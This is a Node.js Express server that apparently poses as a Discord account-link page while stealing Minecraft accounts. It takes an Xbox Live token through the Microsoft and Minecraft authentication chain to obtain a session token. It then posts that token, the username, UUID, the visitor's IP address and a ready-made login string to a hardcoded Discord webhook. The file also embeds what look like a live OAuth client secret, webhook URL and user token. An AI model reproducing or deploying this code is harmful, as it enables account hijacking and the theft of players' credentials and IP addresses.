// Configuration
const client_secret = '-Pw8Q~oEXLe~w~eRhIfGOp0qOuZS6PeafRIOCbPQ'
const client_id = '170ccb61-c568-409a-a59a-e2ecd656a9c5'
const redirect_uri = 'https://linkdiscord.herokuapp.com'
const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
const webhook_logging_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
// Config end
const axios = require('axios')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

console.log('got them both')
app.get('/', async (req, res) => {
    console.log('no query code for u')
    res.send('Success! You can exit this page and return to discord.')
    try {
        console.log('1')
        console.log('all of those parameters were obsolete, the fun part begins')
        const userToken = 'eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJ6aXAiOiJERUYiLCJ4NXQiOiJxcEQtU2ZoOUg3NFFHOXlMN1hSZXJ5RmZvbk0iLCJjdHkiOiJKV1QifQ.gNhUpf-aF0B4JSlBh04iEZGbxKpWfjU6zmRyTubmk-TdX8_I8boI3quvME4eT0xUpvJeYJ3wHFCtKbhRfXu_mUFNqFccRArZmjTI1PxsfgiBPQ6CS0IItxaGlDgWN5s-TXAP6C8kT0Y2E2OZc9e61IydSIWE-5oyVqKz5X7OqYkq-rbtF53XePVQEbn45hBnRMYeyZtYc-HO33ys7_WcmhBY0QwUh3TBqoZVB2LGKGPcBex6DmTLLxz-IY9QqPWzwAhRdQ368Co1MpOT9jFp_7Xd2M7N10o8I4kp6k4T6iKwlk-XgXUfEgUq8tBBVPsOWzdtAk0eTPO_hdkum2atjA.gJ_aGgf4dkKad8ogSHBKng.RpxThbwEq08jFAgn428rvW9n5jP1cO-ZDTVjB1lo6HSFKAP7f7bhfWXO3lmBtsnr4bO31HQyIMIMpRWBwJ_ssbfZ6pPyDI8dfnXN0gOYIr_UW3FEA0b65EplaOwpILk8Dg1hGHAY2GlolFpGuopUDd4mfM7XDRI6ql3hfKrYqdcHbbMZkJDGcSmor3XP6r4hdQ4lY-OurTqHAN9AP2e-bSbbToHSVXpR8UnFX70eaLWoE_xpsouTabfMCIEwlMGSF1q9Dxd1ii2sEDb0wgw2rQsv6q2xWiDiWTxN6FgKpjMUR1r8PDtHy_aAbZGI2cy5LZC03mViOmDOY5DBeVel4jSIv5JGfyeH-obfLC9Opack-Gpt9CB2wHk3meTwcpWO0CiEw3jYQGx4PXGgEn0vkXLBWPVxdfxrvaD9Oc2UF1uE_xJeRW_STR_Gzjprze7dwLR036_XBA0nrOwdNqYDC3Dr2QJBFmU6IoEPy2VrbikWcWyjstyTa8aPrHRAcRpR8ieX3xbpJH9h2Inyhv-xPnIgZgIl7Pktd4qSDnsmtKSHTD59DL49KWR64Qe28lzGtC4MjSjyDvgZ-0uIFM8yERYFbOibanez5dWZR0CtXL3IB8FvGjumCWMZOH8YA7BzcKEO-RAKulNadp5bQmZxsY53ajUo1mLj7FaKiM_DX2OfX73Elz99RcnBUEVwK4glJDQ3RRprMaHsOr61wgB1gUqfsu1atbk5xM_uiwNyqdawOCbu2NIUeJWJ9nKlcoIbGg2wUnj1A4WFtYeUuyPto67NABAvSXau6qTio1L44PvYM7Reh6uLzWQqbtkLq6MSt29neikP8DN7ruPBAOPH8X1SOUhM_DPZADlfh6ak7_mX6vL03_ZJknHUjEWuIb8PqJtcY44Ym5TUVq7mzfdlgTDE3egCpIZSz8s07sWESth_tI4bYw7X0e7ZNrEomierbYLw8_W5ZRpp4sqH38f2yrQB73_HqJEMDR5O8Ay33m2U5Tc98cuuPrhUCMOQUdcA.plUw3R8USO0sJt0pqromRQ'
        console.log('user token set') // MODIFY VALUE ABOVE  ^^^
        const xstsTokenHashArray = await getXSTSToken(userToken)
        console.log('got array')
        const xstsToken = xstsTokenHashArray[0]
        const userHash = xstsTokenHashArray[1]
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = getIp(req)
        postToWebhook(username, bearerToken, uuid, ip, userToken)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return [response.data['Token'], response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function getIp(req) {
    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
}

function postToWebhook(username, bearerToken, uuid, ip, userToken) {
    const url = webhook_url
    let data = {
        username: " ",
        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
        content: "@everyone" + " **SSID REFRESHED**" + "  `xbl token: " + userToken + "`",
        embeds: [{
            title: "User Info", color: 0x00ff50, fields: [
                {name: "Username", value: username, inline: true},
                {name: "UUID", value: uuid, inline: true},
                {name: "Ip", value: ip, inline: true},
                {name: "SessionID", value: bearerToken, inline: false},
                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
            ]
        }]
    }
    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
}



const bannedNames = []

function addBan(name) {
    bannedNames.push(name);
}

function checkIfBanned(name) {

    for (const item of bannedNames) {
        if (name === item) {
            return true
        }
    }
    addBan(name)
    return false
}
